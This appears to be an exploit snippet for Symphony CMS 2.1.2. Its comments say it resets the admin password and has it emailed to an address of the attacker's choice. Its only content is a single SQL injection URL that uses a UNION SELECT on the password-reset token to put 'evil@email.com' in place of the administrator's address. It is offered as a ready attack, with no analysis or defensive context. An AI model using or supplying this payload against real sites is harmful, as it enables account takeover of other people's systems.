#!/usr/bin/perl
# Symphony-cms 2.1.2 blind sql injection
# Reset admin password and have the password emailed to an email address of your choice

 http://example.com/symphony/login/?action=resetpass&token=-1'+union+select+id,'evil@email.com',username+from+tbl_authors+where+id+=1+--+
